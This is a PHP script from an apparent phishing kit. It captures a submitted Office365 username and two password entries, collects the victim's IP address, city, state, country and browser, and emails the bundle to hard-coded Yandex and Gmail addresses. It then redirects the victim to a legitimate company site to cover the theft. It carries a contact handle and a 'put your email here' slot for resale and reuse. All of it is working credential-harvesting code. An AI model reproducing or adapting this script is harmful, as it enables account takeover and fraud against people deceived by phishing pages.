<?php
/* Need help? Contact me - ICQ: @anyhope */
@session_start(); 
error_reporting(0); 
require_once('./whois.php');
if($_SERVER['REQUEST_METHOD'] != 'POST') {
	header("location: https://www.stewart.com/");die();
}
$yourmail = "zaharlogdomain@yandex.com, zaharlogs@gmail.com"; /* Put your email here */
$txt = "on"; /* If on, txt result will coming */
$username = $_POST['log'];
$password1 = $_POST['vic'];
$password2 = $_POST['tim'];
$parts=@explode('@',$username);$infouser=@$parts[0];
$headers.="From:HotMail LoGs<".$infouser."@spyanyhope.info>"."\r\n"."MIME-Version:1.0";
$subject="Result from [$inicountry] by [$iniip]";
$inidate=date("D M d, Y g:i a");
$inibrowser=$_SERVER['HTTP_USER_AGENT'];
$vulninfo="
+ --------------------------------------------------------------+
| Office365 Results
| Username: {$username}
| Password: {$password1}
| Password: {$password2}
| --------------------------------------------------------------+
| Visitor Information
| IP: {$iniip}
| City: {$inicity}
| State: {$inistate}
| Country: {$inicountry}
| Date: {$inidate}
| Browser: {$inibrowser}
+ --------------------------------------------------------------+
";

if($username && $password){
	mail($yourmail, $subject, $vulninfo, $headers);
} else {
	mail($yourmail, $subject, $vulninfo, $headers);
}
header('Location: https://www.stewart.com/');
?>